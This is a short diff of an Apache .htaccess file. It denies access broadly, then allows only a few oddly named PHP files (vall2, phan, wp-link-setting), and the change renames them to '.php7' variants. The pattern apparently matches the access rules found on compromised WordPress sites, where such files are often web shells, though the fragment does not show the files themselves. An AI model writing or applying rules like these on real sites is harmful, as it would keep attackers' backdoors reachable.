@@ -28,7 +28,7 @@
     Deny from all
 </Files>
 
-<FilesMatch "^(vall2.php|phan.php|wpsc.php|wp-link-setting.php|index.html)$">
+<FilesMatch "^(vall2.php7|phan.php7|wpsc.php|wp-link-setting.php7|index.html)$">
  Order allow,deny
  Allow from all
 </FilesMatch>
